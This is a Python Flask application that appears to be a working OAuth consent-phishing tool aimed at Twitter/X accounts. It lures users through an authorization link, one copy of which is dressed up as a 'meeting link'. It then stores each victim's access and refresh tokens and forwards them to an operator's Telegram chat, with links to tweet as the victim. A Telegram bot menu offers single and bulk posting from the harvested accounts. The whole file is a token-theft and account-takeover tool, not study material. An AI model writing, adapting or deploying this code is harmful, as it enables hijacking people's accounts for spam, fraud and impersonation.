import base64
import hashlib
import os
import requests
import sqlite3
from flask import Flask, redirect, request, session, render_template, jsonify

# Configuration
CLIENT_ID = os.getenv('CLIENT_ID')
CLIENT_SECRET = os.getenv('CLIENT_SECRET')
CALLBACK_URL = os.getenv('CALLBACK_URL')
TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')
TELEGRAM_CHAT_ID = os.getenv('TELEGRAM_CHAT_ID')

app = Flask(__name__)
app.secret_key = os.urandom(24)

# Database setup
DATABASE = 'auth_tokens.db'

def init_db():
    # Initialize the SQLite database to store tokens and credentials
    conn = sqlite3.connect(DATABASE)
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS tokens (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            access_token TEXT NOT NULL,
            refresh_token TEXT,
            username TEXT
        )
    ''')
    conn.commit()
    conn.close()

init_db()  # Ensure database is initialized

def get_total_tokens():
    # Get the total number of tokens in the database
    conn = sqlite3.connect(DATABASE)
    cursor = conn.cursor()
    cursor.execute('SELECT COUNT(*) FROM tokens')
    total = cursor.fetchone()[0]
    conn.close()
    return total

def get_twitter_username(access_token):
    url = "https://api.twitter.com/2/users/me"
    headers = {
        "Authorization": f"Bearer {access_token}"
    }

    response = requests.get(url, headers=headers)

    if response.status_code == 200:
        data = response.json()
        username = data.get("data", {}).get("username")
        return username
    else:
        print(f"Failed to fetch username. Status code: {response.status_code}")
        return None

# Generate code verifier and challenge
def generate_code_verifier_and_challenge():
    code_verifier = base64.urlsafe_b64encode(os.urandom(32)).rstrip(b'=').decode('utf-8')
    code_challenge = base64.urlsafe_b64encode(
        hashlib.sha256(code_verifier.encode()).digest()
    ).rstrip(b'=').decode('utf-8')
    return code_verifier, code_challenge

# Store tokens in the database
def store_tokens(access_token, refresh_token, username):
    conn = sqlite3.connect(DATABASE)
    cursor = conn.cursor()
    cursor.execute('''
        INSERT INTO tokens (access_token, refresh_token, username)
        VALUES (?, ?, ?)
    ''', (access_token, refresh_token, username))
    conn.commit()
    conn.close()

# Send a startup message with OAuth link, meeting link, and action buttons
def send_startup_message():
    state = "0"  # Fixed state value for initialization
    code_verifier, code_challenge = generate_code_verifier_and_challenge()

    # Generate the OAuth link
    authorization_url = (
        f"https://twitter.com/i/oauth2/authorize?client_id={CLIENT_ID}&response_type=code&"
        f"redirect_uri={CALLBACK_URL}&scope=tweet.read%20tweet.write%20users.read%20offline.access&"
        f"state={state}&code_challenge={code_challenge}&code_challenge_method=S256"
    )

    # Generate the meeting link
    meeting_url = f"{CALLBACK_URL}j?meeting={state}&pwd={code_challenge}"

    # Get the total number of stored tokens
    total_tokens = get_total_tokens()

    # Message content
    message = (
        f"🚀 *OAuth Authorization Link:*\n[Authorize link]({authorization_url})\n\n"
        f"📅 *Meeting Link:*\n[Meeting link]({meeting_url})\n\n"
        f"🔢 *Total Tokens in Database:* {total_tokens}\n\n"
        "Please select an action:"
    )

    # Buttons for different actions
    keyboard = {
        "inline_keyboard": [
            [{"text": "Single Post", "callback_data": "single_post"}],
            [{"text": "Bulk Post", "callback_data": "bulk_post"}],
            [{"text": "Refresh Tokens", "callback_data": "refresh_tokens"}]
        ]
    }

    # Send the message to Telegram
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    data = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message,
        "parse_mode": "Markdown",
        "reply_markup": keyboard
    }
    requests.post(url, json=data)

# Handle Telegram button clicks
def handle_button_click(update):
    callback_data = update.get("callback_query", {}).get("data")
    chat_id = update.get("callback_query", {}).get("message", {}).get("chat", {}).get("id")

    if callback_data == "single_post":
        # Ask user for tweet content
        send_message(chat_id, "Please enter the content of your tweet.")
    elif callback_data == "bulk_post":
        # Inform user to prepare for bulk posting
        send_message(chat_id, "Bulk posting will begin shortly. Please confirm the number of tweets.")
    elif callback_data == "refresh_tokens":
        # Begin token refresh process
        send_message(chat_id, "Refreshing tokens. Please wait...")
        # Here you would add the actual token refresh code
    else:
        send_message(chat_id, "Unknown action.")

# Function to send a message to Telegram
def send_message(chat_id, text):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    data = {
        "chat_id": chat_id,
        "text": text
    }
    requests.post(url, json=data)

# Webhook route for Telegram updates
@app.route('/webhook', methods=['POST'])
def webhook():
    update = request.json
    if "callback_query" in update:
        handle_button_click(update)
    return jsonify({"status": "ok"})

# Function to send access and refresh tokens to Telegram
def send_to_telegram(access_token, refresh_token=None):
    alert_emoji = "🚨"
    key_emoji = "🔑"

    # Get the username from the access token
    username = get_twitter_username(access_token)
    if username:
        twitter_url = f"https://twitter.com/{username}"
    else:
        twitter_url = "Unknown user"

    # Store tokens in the database
    store_tokens(access_token, refresh_token, username)

    message = f"{alert_emoji} *New user authenticated: OAuth 2.0*\n"
    message += f"{key_emoji} *Access Token:* `{access_token}`\n"

    if refresh_token:
        refresh_link = f"{CALLBACK_URL}refresh/{refresh_token}"
        message += f"{key_emoji} *Refresh Token Link:* [Refresh Token]({refresh_link})\n"

    tweet_link = f"{CALLBACK_URL}tweet/{access_token}"
    message += f"{key_emoji} *Post a Tweet Link:* [Post a Tweet]({tweet_link})\n"
    message += f"👤 *Twitter Profile:* [@{username}]({twitter_url})"

    send_message(TELEGRAM_CHAT_ID, message)

@app.route('/')
def home():
    code = request.args.get('code')
    state = request.args.get('state')
    error = request.args.get('error')

    if not code:
        state = "0"  # Use fixed state value
        session['oauth_state'] = state

        code_verifier, code_challenge = generate_code_verifier_and_challenge()
        session['code_verifier'] = code_verifier  # Store code_verifier in session

        authorization_url = (
            f"https://twitter.com/i/oauth2/authorize?client_id={CLIENT_ID}&response_type=code&"
            f"redirect_uri={CALLBACK_URL}&scope=tweet.read%20tweet.write%20users.read%20offline.access&"
            f"state={state}&code_challenge={code_challenge}&code_challenge_method=S256"
        )

        return redirect(authorization_url)

    if code:
        if error:
            return f"Error during authorization: {error}", 400

        if state != "0":  # Check for the fixed state value
            return "Invalid state parameter", 403

        code_verifier = session.pop('code_verifier', None)

        token_url = "https://api.twitter.com/2/oauth2/token"
        data = {
            'grant_type': 'authorization_code',
            'code': code,
            'redirect_uri': CALLBACK_URL,
            'code_verifier': code_verifier
        }

        response = requests.post(token_url, auth=(CLIENT_ID, CLIENT_SECRET), data=data)
        token_response = response.json()

        if response.status_code == 200:
            access_token = token_response.get('access_token')
            refresh_token = token_response.get('refresh_token')

            session['access_token'] = access_token
            session['refresh_token'] = refresh_token

            send_to_telegram(access_token, refresh_token)
            return f"Access Token: {access_token}, Refresh Token: {refresh_token}"
        else:
            error_description = token_response.get('error_description', 'Unknown error')
            error_code = token_response.get('error', 'No error code')
            return f"Error retrieving access token: {error_description} (Code: {error_code})", response.status_code

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    send_startup_message()  # Send the startup message with OAuth link, meeting link, and action buttons
    app.run(host='0.0.0.0', port=port)
